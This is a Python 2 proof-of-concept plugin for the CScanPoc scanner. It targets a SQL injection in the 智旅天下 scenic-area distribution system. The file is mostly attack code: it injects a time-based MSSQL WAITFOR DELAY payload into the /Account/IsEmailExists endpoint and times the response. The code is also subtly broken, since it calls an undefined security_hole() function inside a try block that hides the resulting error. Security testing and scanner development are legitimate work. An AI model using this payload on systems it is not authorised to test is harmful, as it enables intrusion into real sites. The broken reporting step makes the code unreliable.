# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'Zhilvtianxia_0000'  # 平台漏洞编号，留空
    name = '智旅天下景区分销系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-10-05'  # 漏洞公布时间
    desc = '''
        同程旅游将投入1亿元人民币全面进军“智慧景区”市场，并已成立全资子公司智旅天下信息技术有限公司。
        智旅天下景区分销系统，注入点：/Account/IsEmailExists?Email=admin%40qq.com&UserName=admin
    '''  # 漏洞描述
    ref = 'https://www.secpulse.com/archives/42866.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '智旅天下景区分销系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '941c14be-33ca-477e-9ecd-5b7bbc00ce66'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            arg = self.target
            url = arg + "/Account/IsEmailExists?Email=admin%40qq.com&UserName=admin"
            t1 = time.time()
            code1, _, _, _, _ = hh.http(url + "';WAITFOR+DELAY+'0:0:0'--")
            true_time = time.time() - t1
            t2 = time.time()
            url1 = url + "';WAITFOR+DELAY+'0:0:5'--"
            code2, _, res, _, _ = hh.http(url1)
            false_time = time.time() - t2

            if code1 == 200 and code2 == 200 and false_time-true_time > 4.5:
                security_hole(url1)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
